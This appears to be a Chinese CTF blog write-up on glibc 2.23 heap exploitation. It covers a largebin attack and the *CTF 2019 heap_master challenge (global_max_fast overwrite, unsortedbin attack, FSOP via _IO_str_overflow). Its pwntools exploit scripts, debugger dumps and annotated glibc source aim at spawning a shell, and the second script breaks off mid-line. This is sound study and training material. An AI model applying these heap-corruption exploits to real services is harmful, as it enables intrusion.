<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'1'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,message)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'2'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line">  p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">  p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'3'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1  400+覆盖之后太小了</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#2 --&gt; 可以删掉它，更新chunk list然后达到overlap的目的</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)<span class="comment"># free -&gt;chunk5 but chunk8 here</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#构造一个largebin 一个unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#chunk5-&gt;largebin </span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#chunk2-&gt;unsortedbin</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0xabcd0100</span></span><br><span class="line">fakechunk = target<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fakechunk)<span class="comment"># bk fackchunk-&gt;fd</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fakechunk+<span class="number">8</span>)   <span class="comment">#bk --&gt;fakechunk-&gt;bk</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fakechunk<span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#size 0x56</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'666'</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="为什么size不能是0x55呢？"><a href="#为什么size不能是0x55呢？" class="headerlink" title="为什么size不能是0x55呢？"></a>为什么size不能是0x55呢？</h4><p>0x55&amp;0x2=0（绕不过check）<br>0x56&amp;0x2=2</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/6.png" alt><br>（图片from：<a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/</a>  ）</p>
<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><p><a href="https://bbs.pediy.com/thread-254849.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254849.htm</a><br><a href="http://blog.eonew.cn/archives/709" target="_blank" rel="noopener">http://blog.eonew.cn/archives/709</a></p>
<h3 id="2019-CTF-heap-master"><a href="#2019-CTF-heap-master" class="headerlink" title="2019 *CTF heap_master"></a>2019 *CTF heap_master</h3><p>这真是折磨死我的一道题啊，还有几种方法后续补吧</p>
<p>这道题确实挺有趣的，因为malloc的堆块和edit的free操作对应的堆块位置不同<br>edit和free的操作对象是mmap分配的地址段<br>然后它也没有show函数，所以就本能会想到IO_FILE的leak操作</p>
<h4 id="方法一：global-max-fast-unsortedbin-attack-IO-flash-all-lockp"><a href="#方法一：global-max-fast-unsortedbin-attack-IO-flash-all-lockp" class="headerlink" title="方法一：global_max_fast+unsortedbin attack+IO_flash_all_lockp:"></a>方法一：global_max_fast+unsortedbin attack+IO_flash_all_lockp:</h4><p><strong>参考blog:</strong> <a href="https://shift-crops.hatenablog.com/entry/2019/04/30/131154#heap-master-Pwn-740pt-8-solves" target="_blank" rel="noopener">https://shift-crops.hatenablog.com/entry/2019/04/30/131154#heap-master-Pwn-740pt-8-solves</a></p>
<p>global_max_fast：</p>
<p>关于开头的global_max_fast的使用，其实不是很明白，后来试了试别的地址，发现不改global_max_fast的值，就会报错溢出，至于为啥还是不是很懂<br>–后续–<br>fastbin  free完之后是不用在next chunk的prev_size位赋值的，所以这题free 0xf1大小的堆块理应是有prev_size位的，但是他没有所以会报错。<br><img src="/2020/08/01/largebin-attack-glibc2-23/7,png" alt></p>
<p>其他chunk free完是会有的</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/8.png" alt></p>
<p>好的，global_max_fast改值之后就可以用fastbin操作了（uaf等，uaf是主要），基本上我们要控制stdou的内容的话，用的最多的方法就是uaf、largebin attack，</p>
<p>UAF：同一段chunk，用溢出改写chunk的size位，构造出不同size的free chunk，然后通过溢出修改free chunk的fd，再malloc两次就可以达到任意地址写了（size与构造的fake chunk的size要一致）</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/9.png" alt></p>
<p>这题的话吧，因为malloc的堆不可用<br>bk指针改成global_max_fast，malloc 之后就是把global的值赋值成了main_arena,然后main_arena里面写入global的值</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x57af5000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x57af5000</span></span><br><span class="line">BK: <span class="number">0x7ffff7dd37e8</span> (free_list) ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7ffff7dd1b78</span>                                                             </span><br><span class="line"><span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;: <span class="number">0x0000555555757020</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;:        <span class="number">0x0000000057af5000</span>      <span class="number">0x00007ffff7dd37e8</span></span><br><span class="line"><span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">120</span>&gt;:        <span class="number">0x00007ffff7dd1b88</span>      <span class="number">0x00007ffff7dd1b88</span></span><br><span class="line"><span class="number">0x7ffff7dd1ba8</span> &lt;main_arena+<span class="number">136</span>&gt;:        <span class="number">0x00007ffff7dd1b98</span>      <span class="number">0x00007ffff7dd1b98</span></span><br><span class="line"><span class="number">0x7ffff7dd1bb8</span> &lt;main_arena+<span class="number">152</span>&gt;:        <span class="number">0x00007ffff7dd1ba8</span>      <span class="number">0x00007ffff7dd1ba8</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/01/largebin-attack-glibc2-23/10.png" alt></p>
<p>改chunk_size，为0xf1，是为了free之后进入main_arena 的位置是在main_arena+e*8的上<br>再free一次，(free的是mmap段），让main_arena段的fd和bk都同时指向mmap（恢复未被unsorted bin attack之前的状态）</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/11.png" alt></p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/12.png" alt></p>
<p>再将bk写入stdout的低字节，malloc更改IO_read_end 的地址为main_arena+88<br>又按照上面恢复，继续往bk里面写入stdout+0x10的低字节，malloc将IO_write_base的地址也改成了main_arena+88<br><code>(write_base=read_end效果等效于flag位改成0xfbad1800)</code><br>然后我们就可以leak出来了</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/13.png" alt></p>
<p>触发IO_flush_all_lockp：</p>
<p>接着就开始构造getshell的办法了，这里用的是触发IO_flush_all_lockp，读取数据到栈上，最终实现实现rop</p>
<p>step1:<br>构造fake FILE结构：让stdout指向main_arena，再通过edit size把main_arena+88+0x68的位置上填上mmap的地址(stderr被改成mmap段)<br>step2:<br>在mmap段上_IO_str_overflow伪造劫持控制流：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">int</span> _IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>  <span class="comment">//pass</span></span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *new_buf;</span><br><span class="line">    <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">    _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;  <span class="comment">//这里写上"/bin/sh"</span></span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); <span class="comment">//这里写上system的地址</span></span><br><span class="line">    <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/*    __ferror(fp) = 1; */</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (old_buf)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">        (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">        <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">        fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">    _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">    fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">    fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">    fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绕过检测满足的条件有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_flags &amp; _IO_NO_WRITES为假</span><br><span class="line"><span class="number">2.</span>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only为真，即(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base + flush_only</span><br><span class="line"><span class="number">3.f</span>p-&gt;_flags &amp; _IO_USER_BUF为假</span><br><span class="line"><span class="number">4.</span>_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span> 指向<span class="string">"/bin/sh"</span></span><br><span class="line"><span class="number">5.</span>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)指向system的地址</span><br></pre></td></tr></table></figure>

<p>new_size是放调用函数的参数的地方</p>
<p>所以我们构造四个地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IO_write_ptr  :  <span class="number">0xffffffffffff</span>     (&gt;IO_buf_end)</span><br><span class="line">IO_buf_end  :   (参数存放地址-0x64)/2，比如system('/bin/sh'),存放参数的地址就是/bin/sh的地址</span><br><span class="line">vtable  :   _IO_str_jumps</span><br><span class="line">fp-&gt;_s._allocate_buffer（vtable+<span class="number">0x8</span>，偏移是<span class="number">0xe0</span>）  :  调用函数的地址</span><br></pre></td></tr></table></figure>

<p>所以在exit的时候调用IO_flush_all_lockp会遍历IO_list_all的全部结点找到合适的去执行<code>IO_overflow,_IO_str_jumps-&gt;_IO_str_overflow</code>,<br>脚本里是用了gets，把rop输入到栈上，然后用ret填满，最后执行rop</p>
<p><img src="/2020/08/01/largebin-attack-glibc2-23/14.png" alt></p>
<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>大佬的脚本模板项目：<a href="https://github.com/shift-crops/sc_expwn" target="_blank" rel="noopener">https://github.com/shift-crops/sc_expwn</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('1')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.sendline(str(len(content)))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line">	<span class="comment"># if self.wait:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('3')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span 